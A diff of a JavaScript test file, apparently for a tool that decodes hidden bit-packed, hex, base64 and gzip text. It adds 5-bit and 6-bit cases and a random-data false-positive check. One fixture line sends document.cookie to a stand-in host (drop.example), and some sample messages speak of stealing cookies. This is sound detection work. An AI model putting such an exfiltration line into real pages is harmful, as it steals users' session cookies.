@@ -53,6 +53,23 @@ assert.equal(unpackBits(pack('hidden c2 host', 7), 7), 'hidden c2 host');
 assert.equal(unpackBits(pack('HELLO WORLD', 6), 6), 'HELLO WORLD');
 const packedHex = Buffer.from(pack('send the cookies to the attacker now', 7)).toString('hex');
 assert.equal(best(packedHex).encoding, 'hex+bit7');
+// E88: otomatik arama 5 ve 6 bit genişlikleri de kapsar; rastgele veride yanlış pozitif yok
+const FIVE = 'abcdefghijklmnopqrstuvwxyz .,!?';
+const packWith = (vals, w) => {
+  let bits = vals.map((v) => v.toString(2).padStart(w, '0')).join('');
+  bits = bits.padEnd(Math.ceil(bits.length / 8) * 8, '0');
+  return Buffer.from(bits.match(/.{8}/g).map((b) => parseInt(b, 2))).toString('hex');
+};
+const msg5 = 'send the stolen cookies to the attacker tonight';
+assert.equal(best(packWith([...msg5].map((c) => FIVE.indexOf(c)), 5)).encoding, 'hex+bit5');
+assert.equal(best(packWith([...msg5].map((c) => FIVE.indexOf(c)), 5)).text, msg5);
+const msg6 = 'SEND THE STOLEN COOKIES TO THE ATTACKER TONIGHT';
+assert.equal(best(packWith([...msg6].map((c) => c.charCodeAt(0) - 32), 6)).text, msg6);
+const { randomBytes } = await import('node:crypto');
+for (let i = 0; i < 40; i++) {
+  const r = decodeCandidates(randomBytes(24).toString('hex'));
+  assert.ok(!r.some((c) => /bit[56]/.test(c.encoding)), `rastgele veri bit5/6 sanılmamalı: ${JSON.stringify(r[0])}`);
+}
 // E90: base64 içinde gzip blob
 const { gzipSync } = await import('node:zlib');
 const gz = gzipSync(Buffer.from('fetch("https://drop.example/x?c=" + document.cookie)')).toString('base64');
